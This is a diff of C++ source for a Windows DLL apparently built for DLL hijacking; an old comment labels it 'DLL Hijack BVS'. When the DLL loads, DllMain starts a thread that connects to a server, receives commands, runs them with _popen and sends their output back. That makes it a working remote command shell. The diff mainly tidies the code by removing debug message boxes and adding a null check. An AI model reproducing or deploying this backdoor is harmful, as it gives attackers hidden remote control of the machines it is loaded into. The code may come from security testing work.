@@ -132,9 +132,12 @@ extern "C" __declspec(dllexport) void ConnectToServer() {
     // Receive response from the server
     char command[1024];
     char buffer[1024];
+
     while (true) {
+
         memset(command, 0, sizeof(command));
         int recvResult = recv(clientSocket, command, sizeof(command), 0);
+
         if (recvResult == SOCKET_ERROR) {
             std::cerr << "Failed to receive data" << std::endl;
             showMessageInDLL("Errore socket");
@@ -183,34 +186,22 @@ extern "C" __declspec(dllexport) void ConnectToServer() {
             }
 
             while (fgets(buffer, sizeof(buffer), commandOutput) != nullptr) {
-
-                //int size = MultiByteToWideChar(CP_UTF8, 0, buffer, -1, nullptr, 0);
-                //wchar_t* msg = new wchar_t[size];
-                //MultiByteToWideChar(CP_UTF8, 0, buffer, -1, msg, size);
-                //MessageBox(NULL, msg, L"Popup DLL", MB_OK);
-
                 // Send the output to the socket
                 send(clientSocket, buffer, strlen(buffer), 0);
             }
+
             _pclose(commandOutput);
-            //MessageBoxW(NULL, L"CMD ", L"Popup DLL", MB_OK);
         }
         else {
             // FUTURE IMPL.
-            MessageBoxW(NULL, L"Invalid action", L"Popup DLL", MB_OK);
+            showMessageInDLL("Invalid action");
         }
 
-        //showMessageInDLL(params[0]);
-
-        if (command == nullptr || strnlen(command, 1024) == 0) { //dovrebbe esserci?
+        if (command == nullptr || strnlen(command, 1024) == 0) {
             std::cerr << "No command." << std::endl;
             continue;
         }
 
-        //int size = MultiByteToWideChar(CP_UTF8, 0, command, -1, nullptr, 0);
-        //wchar_t* msg = new wchar_t[size];
-        //MultiByteToWideChar(CP_UTF8, 0, buffer, -1, msg, size);
-        //MessageBox(NULL, msg, L"Popup DLL", MB_OK);
     }
 
     // Close the socket and cleanup Winsock
@@ -227,21 +218,16 @@ DWORD WINAPI ThreadFunction(LPVOID lpParameter)
 
     HANDLE hMutex = CreateMutexW(nullptr, FALSE, mutexName);
 
-    if (hMutex == nullptr)
-    {
-        //MessageBox(NULL,            TEXT("nullptr"),            TEXT("DLL Hijack BVS"),            MB_ICONERROR | MB_OK);
+    if (hMutex == nullptr) {
         std::cerr << "Failed to create mutex." << std::endl;
         return 0;
-    }
-    else if (GetLastError() == ERROR_ALREADY_EXISTS) {
+    } else if (GetLastError() == ERROR_ALREADY_EXISTS) { // Unica istanza già attiva
         CloseHandle(hMutex);
-        //MessageBox(NULL, TEXT("ERROR ALREADY EXISTS"), TEXT("DLL Hijack BVS"), MB_ICONERROR | MB_OK);
         return 0;
     }
 
     ConnectToServer();
 
-    //ReleaseMutex(hMutex);
     CloseHandle(hMutex);
 
     return 1;
@@ -263,7 +249,8 @@ DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
         // Create a thread and close the handle as we do not want to use it to wait for it 
 
         threadHandle = CreateThread(NULL, 0, ThreadFunction, NULL, 0, NULL);
-        CloseHandle(threadHandle);
+        if(threadHandle != nullptr)
+            CloseHandle(threadHandle);
 
         break;
 
